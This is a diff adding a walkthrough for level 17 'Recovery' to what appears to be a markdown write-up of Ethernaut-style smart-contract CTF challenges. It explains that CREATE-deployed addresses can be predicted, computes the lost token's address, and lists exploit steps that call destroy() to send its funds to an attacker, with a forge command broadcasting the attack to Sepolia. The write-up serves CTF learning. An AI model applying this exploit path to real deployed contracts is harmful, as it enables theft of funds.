@@ -375,5 +375,28 @@ forge script script/16-Preservation.s.sol:DeployAttacker --rpc-url $SEPOLIA_RPC_
 forge script script/16-Preservation.s.sol:DeployAttack --rpc-url $SEPOLIA_RPC_URL --broadcast
 ```
 
+## 17-Recovery
+**Difficulty:** 3/5  
+**Vulnerability:** Predictable Contract Address  
 
-   
+### Analysis
+The `Recovery` contract deploys `SimpleToken` contracts using the `CREATE` opcode:
+```javascript
+new SimpleToken(_name, msg.sender, _initialSupply);
+```
+Addresses created via `CREATE` are deterministic and depend only on the creator address and its nonce:
+```javascript
+address = keccak256(rlp.encode([creator, nonce]))[12:]
+```
+Since the target token was the first contract created by `Recovery`, its nonce is `1`.
+
+### Exploit Path
+1. Compute the lost contract address: `address lostContract = vm.computeCreateAddress(RECOVERY_ADDRESS,1);`
+2. Cast the address to ISimpleToken.
+3. Call: `target.destroy(payable(attacker));`
+
+### Execution
+1. Execute the exploit using:
+```bash
+forge script script/17-Recovery.s.sol:DeployAttack --rpc-url $SEPOLIA_RPC_URL --broadcast
+```   
